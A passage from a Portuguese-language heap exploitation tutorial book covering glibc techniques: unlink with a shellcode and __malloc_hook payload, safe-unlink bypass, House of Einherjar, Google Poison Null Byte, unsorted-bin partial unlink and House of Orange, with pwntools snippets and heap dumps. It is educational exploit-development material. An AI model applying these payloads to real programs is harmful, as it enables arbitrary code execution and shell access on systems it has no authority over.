comprometer algum pointer que nos de execu√ß√£o, por exemplo:</p>
<ul>
<li>Qualquer um dos __malloc_hooks</li>
<li>GOT (Sem <code>RELRO</code>)</li>
<li>.dtors (ainda existia nos bins velhos)</li>
</ul>
<p>Porem temos um problema: o write refletido, alem de 
fazer um pointer apontar para o nossa payload, acaba 
escrevendo um valor no meio da payload! :(</p>
<p>Assim, vamos precisar de um <code>NOP slide</code> especial!</p>
<pre><code>90
  90
    90
      90    &lt;---- Mira execu√ß√£o aqui
        90
          90
            JMP Payload ---------
              90                |
                90              |             
                  90            |    
corrup√ß√£o  ----&gt;    90          |
cai aqui              90        |
                        90      |
                          90    V
                            PAYLOAD
</code></pre>
<p>Assim, a payload fica intacta</p>
<blockquote>
<p>Obs: se voce tem um <code>write-after-free</code>, basta fazer</p>
<ul>
<li>Overflow</li>
<li>Corrompe</li>
<li>Write: nova payload</li>
<li>Trigger</li>
</ul>
</blockquote>
<p>E colocando tudo isso junto:</p>
<h1 id="final"><a class="header" href="#final">Final</a></h1>
<pre><code class="language-py">    asm(&quot;jmp shellcode;&quot; + &quot;nop;&quot;*0x20 + &quot;shellcode:&quot; + shellcraft.execve(&quot;/bin/sh&quot;)) + 
    b'A'*pad + 
    flat(
      0x91,#                size
      heap - 0x18 + 0x28,#  fd - 0x18 | + 0x28 offset para o nosso chunk por exemplo
      __malloc_hook - 0x10,# bk - 0x10
    )
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="heap/malloc/safeUnlink.html#teoria">Teoria</a></li>
<li><a href="heap/malloc/safeUnlink.html#data">.data</a>
<ul>
<li><a href="heap/malloc/safeUnlink.html#exploit">Exploit</a>
<ul>
<li><a href="heap/malloc/safeUnlink.html#safe-unlink">Safe Unlink</a></li>
<li><a href="heap/malloc/safeUnlink.html#edit-no-usr123-para-controlar-todos-os-pointers">Edit no usr123 para controlar todos os pointers</a></li>
<li><a href="heap/malloc/safeUnlink.html#arbwrite---definir-alvo">Arbwrite - Definir alvo</a></li>
<li><a href="heap/malloc/safeUnlink.html#arbwrite---definir-valor">Arbwrite - Definir valor</a></li>
</ul>
</li>
<li><a href="heap/malloc/safeUnlink.html#unindo-tudo">Unindo tudo</a></li>
</ul>
</li>
<li><a href="heap/malloc/safeUnlink.html#outros-exemplos">Outros exemplos</a></li>
</ul>
<h2 id="teoria-11"><a class="header" href="#teoria-11">Teoria</a></h2>
<p>O safe unlink depende muito da implementa√ß√£o do programa, isso quer dizer 
que nao existe uma formula bonitinha para conseguir uma shell...</p>
<p>A mitiga√ß√£o que foi introduzida se consiste em:</p>
<ul>
<li><code>assert</code>(vitima.fd.bk == vitima)</li>
<li><code>assert</code>(vitima.bk.fd == vitima)</li>
</ul>
<p>Assim, agora alem de o <code>fd falso</code> e <code>bk falso</code> precisarem ser endere√ßos 
validos, precisaremos de que:</p>
<ul>
<li><code>fd falso</code> + 0x18 == pointer para <code>vitima</code></li>
<li><code>bk falso</code> + 0x10 == pointer para <code>vitima</code></li>
</ul>
<p>Assim, precisamos de 1 ou 2 pointers que apontam para o nosso chunk, e que 
esse pointer seja importante.</p>
<h2 id="data"><a class="header" href="#data">.data</a></h2>
<p>Caso o programa tenha um struct com pointers para o heap, e acesse o heap por meio deles</p>
<pre><code class="language-x86asm">.data
struct Usu√°rioLogado:
    nome: pointer para chunk, -&gt; aponta para vitima
    senha: pointer para chunk,
    metadados: pointer para chunk,

</code></pre>
<p>E o programa use:</p>
<pre><code>edit( * usr123.nome, novo_nome )
</code></pre>
<h3 id="exploit-4"><a class="header" href="#exploit-4">Exploit</a></h3>
<h4 id="safe-unlink"><a class="header" href="#safe-unlink">Safe Unlink</a></h4>
<p>Nos podemos mirar o <code>fd falso</code> e <code>bk falso</code> apontando para o pointer que 
aponta para a vitima, passando o check de seguran√ßa...</p>
<p>Agora <code>fd</code> sera escrito no <code>*bk</code> e <code>bk</code> sera escrito no <code>*fd</code> (+ os offsets), 
mas os dois sao o mesmo alvo, ent√£o como consequ√™ncia somente teremos a 
altera√ß√£o de <code>usr123.nome</code> para o valor de <code>fd/bk</code> isto e:
ele aponta para ele mesmo (ou antes por causa dos offsets (+0x16,0x10,...))
<code>usr123.nome</code> = <code>&amp; usr123.nome</code></p>
<h4 id="edit-no-usr123-para-controlar-todos-os-pointers"><a class="header" href="#edit-no-usr123-para-controlar-todos-os-pointers">Edit no usr123 para controlar todos os pointers</a></h4>
<p>Agora, caso tentemos editar o nome, vamos na verdade ter um write no struct 
<code>usr123</code> (e adjacentes)</p>
<pre><code>edit( * usr123.nome, novo_nome )
</code></pre>
<p>E agora que controlamos todos os pointers por meio do <code>novo_nome</code>, podemos 
altera-los, com cada um abrindo uma nova avenida de exploita√ß√£o... </p>
<h4 id="arbwrite---definir-alvo"><a class="header" href="#arbwrite---definir-alvo">Arbwrite - Definir alvo</a></h4>
<p>O mais obvio √© alterar o <code>usr123.nome</code> de novo... nos dando um <code>arbwrite</code></p>
<pre><code>edit( * usr123.nome, __malloc_hook - 0x20 )
</code></pre>
<h4 id="arbwrite---definir-valor"><a class="header" href="#arbwrite---definir-valor">Arbwrite - Definir valor</a></h4>
<p>agora <code>usr123.nome</code> aponta para o <code>__malloc_hook</code> e o proximo edit vai 
altera-lo...</p>
<h3 id="unindo-tudo-1"><a class="header" href="#unindo-tudo-1">Unindo tudo</a></h3>
<blockquote>
<p><code>mudarNome</code>(<code>novo_nome</code>) = wrapper para interagir com o programa chamando o c√≥digo de editar o nome</p>
</blockquote>
<ul>
<li>Start
<ul>
<li><code>usr123.nome</code> -&gt; vitima</li>
</ul>
</li>
<li>Safe Unlink apontando para <code>usr123.nome</code>
<ul>
<li><code>usr123.nome</code> -&gt; <code>usr123.nome</code></li>
</ul>
</li>
<li>mudarNome( <code>__malloc_hook</code> - <code>0x20</code> ) 
<ul>
<li><code>usr123.nome</code> -&gt; antes do <code>__malloc_hook</code></li>
</ul>
</li>
<li>mudarNome( <code>A</code>*<code>pad</code> + <code>libc.system</code> )</li>
</ul>
<h2 id="outros-exemplos"><a class="header" href="#outros-exemplos">Outros exemplos</a></h2>
<p>Outros cen√°rios que podem ser vi√°veis passar essa mitiga√ß√£o incluem:</p>
<ul>
<li>Pointer na stack para o chunk
<ul>
<li>talvez de para alterar o ret salvo</li>
</ul>
</li>
<li>Voce forjar o seu pr√≥prio pointer caso tenha um heap leak</li>
<li>Os metadados de um free chunk que aponte para vitima</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="heap/malloc/HouseOfEinherjar.html#prerrequisitos">Prerrequisitos</a></li>
<li><a href="heap/malloc/HouseOfEinherjar.html#chunk-falso">Chunk falso</a>
<ul>
<li><a href="heap/malloc/HouseOfEinherjar.html#obs-libc-">OBS: libc &lt;</a></li>
</ul>
</li>
<li><a href="heap/malloc/HouseOfEinherjar.html#free">Free</a></li>
<li><a href="heap/malloc/HouseOfEinherjar.html#vitima-adjacente-ao-top">Vitima adjacente ao top</a></li>
</ul>
<p>Na House of Einherjar, nos queremos que malloc retorne um chunk 
<strong>FORA</strong> do heap (<code>.data</code>, etc...) usando um 
<code>single null byte overflow</code> (aka <code>poison null byte</code>) contra um 
chunk alocado. Quando somente um null byte vaza o buffer, 
comumente sendo um null byte de finaliza√ß√£o de strings....</p>
<h1 id="prerrequisitos"><a class="header" href="#prerrequisitos">Prerrequisitos</a></h1>
<p>Para isso. alem do overflow, vamos precisar de um infoleak do 
heap, e um do endere√ßo do chunk falso. Pois nos vamos consolidar 
um chunk ate o nosso chunk falso.</p>
<p>Alem disso, o chunk vitima do overflow precisa ter tamanho 0x100, 
0x200, etc... Pois, caso o tamanho fosse, por exemplo 0x30, ele 
simplesmente viraria 0x00, o que nao seria muito util. Assim, o 
nosso overflow nao muda o tamanho do chunk, somente as flags:</p>
<blockquote>
<p>0x0201 -&gt; 0x0200 (mesmo size, sem prev_use)</p>
</blockquote>
<p>Assim, quando chamarmos free no chunk vitima, por ter seu 
<code>prev_use=0</code>, ele vai tentar consolidar com o chunk de tr√°s (obs: 
considera√ß√µes adicionais sobre consolidar pra frente com o top 
chunk ao final do post). </p>
<p>Assim, nos devemos alterar o <code>prev-size</code> e deixa-lo enorme, para 
que alcance o chunk falso:</p>
<pre><code> ____________  
|     | size | &lt;- FAKE
|  fd |  bk  |      
|____________|
     ....

     ....

     ....

     ....
 ____________
|     | size |
| AAAAAAAAAA |
| AAAAAAAAAA |
|     ...    |
| AAAAAAAAAA |
| prev | 200 | -&gt; prev_use desativado
|____________|

</code></pre>
<p>o <code>prev</code> deve ser igual ao offset: </p>
<blockquote>
<p>&amp;<code>vitima</code> - &amp;<code>FAKE</code></p>
</blockquote>
<h1 id="chunk-falso"><a class="header" href="#chunk-falso">Chunk falso</a></h1>
<p>Alem disso, como nos vamos consolidar, precisaremos passar pelo 
SAFE unlink... Portanto, basta colocar:</p>
<blockquote>
<p><code>fd</code> = <code>bk</code> = &amp;<code>FAKE</code></p>
</blockquote>
<p>Alem disso, por causo do check: <code>corrupted size versus prev size</code>, 
nos precisamos que o size do chunk falso tamb√©m seja:</p>
<blockquote>
<p>&amp;<code>vitima</code> - &amp;<code>FAKE</code></p>
</blockquote>
<h2 id="obs-libc"><a class="header" href="#obs-libc">OBS: libc &lt;</a></h2>
<p>Nessas vers√µes do libc, a implementa√ß√£o do 
<code>corrupted size versus prev size</code> foi mal feita:</p>
<pre><code class="language-C">if ( __builtin_expect (chunksize(P) != prev_size (next_chunk(P)) ,0))
    malloc_printerr (&quot;corrupted size versus prev size&quot;);
</code></pre>
<p>O prev_size usado nao √© o certo, e sim calculado usando o pr√≥prio 
chunk fake</p>
<pre><code> _____________  
|      | size | 
|  fd  |  bk  | 
|             |
|     ...     |
|             |
| prev |      | &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; E SIM ESSE
|_____________|
     ....

     ....

     ....

     ....
 ____________
|     | size |
| AAAAAAAAAA |
| AAAAAAAAAA |
|     ...    |
| AAAAAAAAAA |
| prev | 200 | &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; NAO SERA ESSE
|____________|

</code></pre>
<p>Isso quer dizer que durante a cria√ß√£o do chunk falso, basta 
colocar um <code>prev_size</code> (do fake) igual ao <code>size</code>....</p>
<p>Porem existe um truque mais f√°cil: basta colocar <code>size=8</code></p>
<p>Assim, o endere√ßo dos dois fica igual... ja que o <code>prev_size</code> sera 
calculado com :</p>
<blockquote>
<p>&amp;<code>FAKE</code> + <code>size</code> - <code>8</code></p>
</blockquote>
<p>Em condi√ß√µes normais, isso retorna o <code>prev_size</code> do proximo chunk..
Porem com <code>size=8</code>, nos temos que ele aponta para o mesmo endere√ßo 
do <code>size</code>. Com isso, eles sao necessariamente iguais, passando o 
<code>corrupted size versus prev size</code></p>
<p>Portanto, voce tem no minimo 3 maneiras diferentes de burlar o 
mecanismo de seguran√ßa :D</p>
<h1 id="free"><a class="header" href="#free">Free</a></h1>
<p>Com tudo isso pronto, basta chamar <code>free()</code> na vitima, que ela 
sera consolidada com o chunk falso...</p>
<p>Agora, basta chamar malloc que o chunk falso sera alocado, te 
dando elevado controle sobre a <code>.data</code>...</p>
<h1 id="vitima-adjacente-ao-top"><a class="header" href="#vitima-adjacente-ao-top">Vitima adjacente ao top</a></h1>
<p>Caso a vitima esteja do lado do top chunk, ele sera consolidado 
com ela e com o fake:</p>
<pre><code> _____________  
|      | size | 
|  fd  |  bk  | 
|             |
|     ...     |
|             |
| prev |      |
|_____________|
     ....

     ....

     ....

     ....
 ____________
|     | size |
| AAAAAAAAAA |
| AAAAAAAAAA |
|     ...    |
| AAAAAAAAAA |
| prev | 200 |
|     ...    |
|     ...    |
|     ...    |
|      | top |
|____________|

</code></pre>
<p>Assim, movendo o endere√ßo do top para &amp;<code>FAKE</code></p>
<pre><code> _____________  
|      |  top | 
|_____________| 
|             |
|             |
|             |
|             |
|_____________|
     ....

     ....

     ....

     ....
 ____________
|            |
|            |
|            |
|            |
|            |
|            |
|            |
|            |
|            |
|            |
|____________|

</code></pre>
<p>Com todas as aloca√ß√µes seguintes vindo de la!</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="google-poison-null-byte"><a class="header" href="#google-poison-null-byte">Google Poison Null Byte</a></h1>
<ul>
<li><a href="heap/malloc/GooglePoisonNull.html#google-poison-null-byte">Google Poison Null Byte</a></li>
<li><a href="heap/malloc/GooglePoisonNull.html#prerrequisitos">Prerrequisitos</a></li>
<li><a href="heap/malloc/GooglePoisonNull.html#ataque">Ataque</a></li>
</ul>
<p>Essa tecnica se parece com a House of Einherjar, porem nela nos 
precis√°vamos usar null bytes no <code>prev_size</code> e dado que overflows 
de Null Byte tendem a ocorres com strings, nos nao poder√≠amos 
usa-los.</p>
<p>Assim, essa tecnica √© mais realista, ja que leva badchars em 
considera√ß√£o. Portanto, ela ja foi usada em m√∫ltiplos ataques na 
vida real.</p>
<p>Alem disso, eles se diferenciam pois nessa tecnica o nosso Null 
byte corrompe o <code>size</code> de um <code>FREE chunk</code>... Portanto, essa 
tecnica busca criar um overlap entre dois chunks</p>
<h1 id="prerrequisitos-1"><a class="header" href="#prerrequisitos-1">Prerrequisitos</a></h1>
<p>Os prerrequisitos dessa tecnica para o chunk vitima sao o sao o 
oposto da House of Einherjar:</p>
<ul>
<li>chunk overflow
<ul>
<li>Qualquer size </li>
<li>overflow de 1 Null Byte </li>
</ul>
</li>
<li>chunk vitima 
<ul>
<li>FREE </li>
<li><code>size</code> &gt; <code>0x100</code></li>
<li><code>size</code> <strong>NAO!!!</strong> terminado em <code>0x00</code>. Ex: <code>0x410</code>, <code>0x3a0</code>... </li>
</ul>
</li>
<li>chunk consolida√ß√£o
<ul>
<li>Tamanho que permita consolida√ß√£o: <code>size</code> &gt;= <code>0x90</code></li>
</ul>
</li>
<li>Um chunk qualquer para prevenir consolida√ß√£o com o TOP</li>
</ul>
<h1 id="ataque-1"><a class="header" href="#ataque-1">Ataque</a></h1>
<pre><code class="language-py">chunk_A = malloc(0x18)  # chunk overflow: qualquer tamanho 
chunk_B = malloc(0x308) # chunk vitima: 0x310 
chunk_C = malloc(0x98)  # chunk consolida√ß√£o: size &gt;= 0x90
chunk_D = malloc(0x98)  # Prevenir consolida√ß√£o TOP

free(chunk_B)


OBS: Caso o libc tenha &quot;prev vs prev size&quot; (&gt; 2.26) :
  Precisar√≠amos forjar um PREV_SIZE falso pro chunk_B
  (ele deve ficar na posi√ß√£o do prev_size caso o chunk_B ja 
  tivesse sido reduzido (pad = 0x300-0x10))

  edit(chunk_B, &quot;\x00&quot;*(0x2f0) + p16(0x300))
  free(chunk_B)

Para simplificar, vamos assumir uma vers√£o mais antiga do libc
  

 _______________  chunk_A
|               |
|               |
|_______________| chunk_B
|       | 0x311 |  FREE: UNSORTED
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

edit(chunk_A, 0x18*b&quot;A&quot;)  # vamos assumir que o programa coloque o 
                          # NULL ao final automaticamente

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B
| AAAAA | 0x300 |  FREE: UNSORTED
|               |  SIZE ALTERADO PARA 0x300 (-0x10)
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

Assim, o chunk vitima teve seu tamanho diminu√≠do em: mod 0x100

Vamos chamar essa diferen√ßa de DIFF

Por exemplo: 
  0x310 -&gt; 0x300    DIFF=0x10
  0X4a0 -&gt; 0x400    DIFF=0xa0
  ...               DIFF=(size mod 0x100)

Essa diferen√ßa ira gerar muitos problemas!

Agora, vamos alocar um chunk que divida o B por meio de remainder

chunk_B1 = malloc(0xf8) # 0x100 por exemplo, mas poderia ser tamb√©m
                        # 0x110, 0x120, ..., 0x200,...

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1
| AAAAA | 0x101 | 
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| resto do chunk_B
|       | 0x201 | FREE: UNSORTED
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| Espa√ßo bugado de tamanho DIFF
| 0x200 |       |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|


Nao atualizou o prev_size do chunk_C como deveria, pois
deu write num endere√ßo 0x10 (DIFF) antes do correto  
(Justamente no Espa√ßo bugado de tamanho DIFF)

Ent√£o o prev_size do chunk_C continua = 0x310


Agora, vamos alocar um chunk que gaste o &quot;resto do chunk_B&quot;

chunk_B2 = malloc(0x1f8) # 0x200

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1
| AAAAA | 0x101 | 
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| chunk_B2
|       | 0x201 |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| Espa√ßo bugado de tamanho DIFF
| 0x200 |   1   |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

Assim como no anterior, errou a mira por 0x10 (DIFF)!

Dessa vez, nao atualiza o PREV_IN_USE do C


Portanto, por causa do PREV_USE e PREV_SIZE errados, 
se free(chunk_C), ele vai consolidar com chunk_B1 (que tem o mesmo 
endere√ßo que o chunk_B), pois acredita que ele esta FREE


Assim, ter√≠amos que forjar fd e bk no chunk_B1, para que ele 
passe o safe unlink! Mas nos precisar√≠amos de um heap leak e 
da habilidade de escrever NULLBYTES 

Para burlar isso, vamos simplesmente dar free() nele, gerando 
pointers leg√≠timos

free(chunk_B1)

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1
| AAAAA | 0x101 | FREE: UNSORTED
|   FD  |   BK  | FD e BK leg√≠timos
|               |
|               |
|               |
|               |
|               |
|_______________| chunk_B2
|       | 0x200 | PREV_USE = 0 (porem nao importa)
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| Espa√ßo bugado de tamanho DIFF
| 0x200 |   1   |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

Agora podemos chamar free no chunk_C, consolidando com o chunk_B1

free(chunk_C)

Da perspectiva do MALLOC temos:
 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1 + chunk_C
| AAAAA | 0x401 | FREE: UNSORTED
|   FD  |   BK  | 
|               |
|               |
|               |
|               |
|               |
|               | 
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               | 
|               |
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

Porem nos sabemos que o chunk_B2 continua ali! Criando um overlap

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1 + chunk_C
| AAAAA | 0x401 | FREE: UNSORTED
|   FD  |   BK  | 
|               |
|               |
|               |
|               |
|               |
|. . . . . . . .| chunk_B2               
|               |
|               |
|               |
|               | 
|               |
|               |
|               |
|               |
|. . . . . . . .|
|               |
|               |
|               |
|               |
|               |
|               |
|               | 
|               |
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

E lembrando que, a nao ser que CALLOC tenha sido usado, ainda 
existe um monte de metadados largados la no meio (por exemplo, no 
espa√ßo DIFF), ou os pr√≥prios pointers do chunk_B2

</code></pre>
<p>Agora com esse primitivo, voce poderia fazer muitas coisas, 
por exemplo, um libc leak: </p>
<ul>
<li><code>chunk_E</code> = <code>malloc</code>(<code>size chunk_B1</code>)</li>
<li><code>read</code>(<code>chunk_B2</code>)</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="unsorted-bins-partial-unlink"><a class="header" href="#unsorted-bins-partial-unlink">Unsorted bins: Partial Unlink</a></h1>
<p>Nos unsorted bins, nao √© necess√°rio fazer um unlink completo.
Quando procurando um chunk nos unsorted bins, segue o procedimento:</p>
<ul>
<li>Segue da Tail -&gt; Head</li>
<li>Conforme vai andando, <code>sort</code> os chunks no bins apropriados
<ul>
<li><code>small bins</code> ou <code>large bins</code></li>
<li>Quando ele vai ser transferido da <code>unsorted</code> para <code>small/large</code>, faz um <strong>parcial unlink</strong></li>
</ul>
</li>
<li>Caso encontre um tamanho exato <code>exact fit</code>: <code>malloc</code>
<ul>
<li>Quando vai ser alocado, faz um <strong>parcial unlink</strong> </li>
</ul>
</li>
</ul>
<blockquote>
<p>Obs: Isso √© uma simplifica√ß√£o, ignorando <code>remainder</code> e outros fatores...</p>
</blockquote>
<p>O processo de parcial unlink √© similar ao unlink completo, porem somente o bk!</p>
<pre><code> head              vitima                tail  
 _V_   bk  ___       _V_       ___       _V_ 
|   | --&gt; |   | --&gt; |   | --&gt; |   | --&gt; |   |
|___| &lt;-- |___| &lt;-- |___| &lt;-- |___| &lt;-- |___|
      fd 

            vitima.fd.bk = vitima.bk
                    copiado
 head             |---------|            tail  
 _V_       ___    |   bk    V  ___       _V_ 
|   | --&gt; |   | --&gt; ----&gt; --&gt; |   | --&gt; |   |
|___| &lt;-- |___| &lt;--   X   &lt;-- |___| &lt;-- |___|
                 fd ignorado
                     ___ 
                    |   |
                    |___| 
</code></pre>
<p>assim, nos seus UAF e semelhantes, basta somente fazer: user_data = <code>p64</code>(<code>0</code>) + <code>p64</code>(<code>target</code>)</p>
<p>Assim, temos um <code>write</code> em que <code>CONTROLAMOS O ENDERE√áO</code>, mas <strong>NAO</strong> 
controlamos o valor</p>
<p>O valor √© o endere√ßo da <code>head</code> do <code>small/large bin</code> de tamanho vitima.<code>size</code></p>
<p>Para prop√≥sitos de exploit, isso quer dizer que estamos apontando algo
para o nosso chunk... Essa t√©cnica sera util na House Of Orange !</p>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="heap/malloc/HouseOfOrange.html#house-of-orange">House Of Orange</a></li>
<li><a href="heap/malloc/HouseOfOrange.html#teoria">Teoria</a>
<ul>
<li><a href="heap/malloc/HouseOfOrange.html#gerar-um-free-chunk">Gerar um Free Chunk</a>
<ul>
<li><a href="heap/malloc/HouseOfOrange.html#extens%C3%A3o-do-heap">Extens√£o do heap</a></li>
</ul>
</li>
<li><a href="heap/malloc/HouseOfOrange.html#unsorted-bins">Unsorted Bins</a></li>
<li><a href="heap/malloc/HouseOfOrange.html#corromper-_io_list_all">Corromper _IO_list_all</a></li>
</ul>
</li>
<li><a href="heap/malloc/HouseOfOrange.html#exploit">Exploit</a>
<ul>
<li><a href="heap/malloc/HouseOfOrange.html#heap-extension">Heap Extension</a></li>
<li><a href="heap/malloc/HouseOfOrange.html#unsorted-bins--io_list_all">Unsorted Bins + IO_list_all</a></li>
</ul>
</li>
</ul>
<h1 id="house-of-orange"><a class="header" href="#house-of-orange">House Of Orange</a></h1>
<h1 id="teoria-12"><a class="header" href="#teoria-12">Teoria</a></h1>
<p>O ataque da House Of Orange se consiste em:</p>
<ul>
<li>Gerar um free chunk
<ul>
<li>Por exemplo, ativando o c√≥digo de extens√£o do heap </li>
</ul>
</li>
<li>Corromper o free chunk</li>
<li><a href="https://0xturazzi.github.io/book/heap/malloc/PartialUnlink.html">Ataque dos Unsorted Bins</a></li>
<li><a href="https://0xturazzi.github.io/book/heap/relacionados/io_list_all.html">Corromper _IO_list_all</a>
<ul>
<li>M√©todo: Forjar chunk falso no heap</li>
</ul>
</li>
</ul>
<blockquote>
<p>OBS: Glibc &lt;= </p>
</blockquote>
<h2 id="gerar-um-free-chunk"><a class="header" href="#gerar-um-free-chunk">Gerar um Free Chunk</a></h2>
<p>Para executar esse ataque, voce vai precisar de um free chunk nos unsorted 
bins. Ele obviamente pode ser corrompido com um <code>write-after-free</code> ou overflow.</p>
<p>Porem um t√©cnica que costuma vir combinada com a HoO √© ativar o c√≥digo de 
extens√£o do heap</p>
<h3 id="extens√£o-do-heap"><a class="header" href="#extens√£o-do-heap">Extens√£o do heap</a></h3>
<p>Explicada melhor em breve, porem resumindo... Corromper o top chunk com:</p>
<pre><code>PAGE_SIZE    -    usado     +      1
0x1000       soma do tamanho   PREV_INUSE
              dos chunks ja
                alocados
</code></pre>
<p>E alocar um chunk grande, fazendo com que malloc:</p>
<ul>
<li>Crie um novo heap em outra parte da memoria</li>
<li>Transforme o resto do heap antigo em um free chunk</li>
<li>Coloque FencePost chunks no final do heap antigo</li>
</ul>
<blockquote>
<p>Fencepost: Chunk de tamanho ilegal 0x10 usado para evitar que malloc leia regi√µes 
nao alocadas da memoria (gerando <code>SEGFAULT</code>) quando olhando os chunks para frente!</p>
</blockquote>
<p>Assim, nos conseguimos um free chunk mesmo que o programa nunca chame free 
diretamente!</p>
<h2 id="unsorted-bins"><a class="header" href="#unsorted-bins">Unsorted Bins</a></h2>
<p>O Ataque ja foi descrito em outro post, ent√£o nao vou perder muito tempo aqui,
o fato a se ressaltar √© que na HoO idealmente devemos realizar o parcial unlink 
por meio de um <strong>SORT</strong> !! </p>
<p>Alem disso, apos o sort, ele precisa ser a head do seu respectivo fastbin. 
Portanto sera necess√°rio voce preparar o heap anteriormente caso ja exista 
algo la antes...</p>
<p>Isto ocorre pois quando realizarmos o unsorted bins vamos escrever o 
<strong>ENDERE√áO DA HEAD</strong>, e o valor nesse endere√ßo sera o nosso chunk</p>
<h2 id="corromper-_io_list_all"><a class="header" href="#corromper-_io_list_all">Corromper _IO_list_all</a></h2>
<p>O alvo do nosso unsorted bins sera o _IO_list_all</p>
<p>Porem, ele nao vai passar os checks de seguran√ßa do unlink, mas isso nao √© um 
problema, pois em vers√µes do <strong>Glibc &lt;=</strong> os <code>overflows</code> do <code>stdio</code> (e outras<br />
filestreams) ainda ser√£o chamados, nos permitindo executar o ataque do 
IO_list_all :D</p>
<p>Assim, uma parte da <code>main arena</code> sera interpretada como uma filestream, porem 
nao passara os checks de <code>mode</code>, etcetc</p>
<p>Assim, o seu <code>_chain</code> sera seguido, e justamente nesse endere√ßo precisamos dar 
o sort para a head mencionada anteriormente! Agora, o nosso chunk sera tratado 
como uma filestream, e nos podemos passar os checks de seguran√ßa e forjar uma 
vtable. </p>
<p>Assim ganhando a shell apos as mitiga√ß√µes do Glibc serem ativadas e <code>abort()</code> 
chamado, no ultimo segundo do processo de finaliza√ß√£o!</p>
<h1 id="exploit-5"><a class="header" href="#exploit-5">Exploit</a></h1>
<h2 id="heap-extension"><a class="header" href="#heap-extension">Heap Extension</a></h2>
<p>Vamos supor que o programa tenha chunk tem tamanho <code>0x20</code> e ao 
edita-lo temos um overflow. Assim podemos criar um helper no nosso 
exploit para editar esse chunk: <code>edit_vuln()</code></p>
<p>Tamb√©m vamos supor que esse foi o primeiro e √∫nico chunk, assim fazendo 
fronteira com o <code>top chunk</code>, e tornando a quantidade usada do heap = <code>0x20</code></p>
<blockquote>
<p>Para a t√©cnica, o √∫nico requerimento √© poder corromper o top chunk, essas 
condi√ß√µes ideais sao somente para simplificar a explica√ß√£o</p>
</blockquote>
<pre><code class="language-x86asm">Allocated chunk | PREV_INUSE
Addr: 0x55bca860c000
Size: 0x21
</code></pre>
<p>Por ultimo, nos temos um helper que nos permite alocar um chunk 
grande: <code>malloc_grande()</code></p>
<p>Assim, podemos corromper o tamanho do top chunk usando:</p>
<pre><code class="language-py">usado = 0x20 # Quanto do heap ja foi usado, por exemplo 0xa0, 0xc0,...

edit_vuln(flat(
  0,
  0,
  0,
  0x1000 - usado + 1  
))

malloc_grande()
</code></pre>
<p>Agora temos um free chunk, nos unsorted bins, logo apos o chunk do 
overflow</p>
<pre><code class="language-x86asm">Allocated chunk | PREV_INUSE
Addr: 0x55bca860c000
Size: 0x21

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55bca860c020
Size: 0xfc1
fd: 0x7f06c67a6b78
bk: 0x7f06c67a6b78

Allocated chunk
Addr: 0x55bca860cfe0
Size: 0x10

Allocated chunk | PREV_INUSE
Addr: 0x55bca860cff0
Size: 0x11

Allocated chunk
Addr: 0x55bca860d000
Size: 0x00
</code></pre>
<pre><code class="language-x86asm">0x55bca860c000  0x0000000000000000  0x0000000000000021   &lt;-- Vuln Chunk
0x55bca860c010  0x0000000000000000  0x0000000000000000
0x55bca860c020  0x0000000000000000  0x0000000000000fc1   &lt;-- unsortedbin[all][0]
0x55bca860c030  0x00007f06c67a6b78  0x00007f06c67a6b78
0x55bca860c040  0x0000000000000000  0x0000000000000000
0x55bca860c050  0x0000000000000000  0x0000000000000000
0x55bca860c060  0x0000000000000000  0x0000000000000000
0x55bca860c070  0x0000000000000000  0x0000000000000000
0x55bca860c080  0x0000000000000000  0x0000000000000000
0x55bca860c090  0x0000000000000000  0x0000000000020f71  
0x55bca860c0a0  0x0000000000000000  0x0000000000000000
...
...
...
0x55bca860cfa0  0x0000000000000000  0x0000000000000000
0x55bca860cfb0  0x0000000000000000  0x0000000000000000
0x55bca860cfc0  0x0000000000000000  0x0000000000000000
0x55bca860cfd0  0x0000000000000000  0x0000000000000000
0x55bca860cfe0  0x0000000000000fc0  0x0000000000000010   &lt;-- Fenceposts
0x55bca860cff0  0x0000000000000000  0x0000000000000011
</code></pre>
<h2 id="unsorted-bins--io_list_all"><a class="header" href="#unsorted-bins--io_list_all">Unsorted Bins + IO_list_all</a></h2>
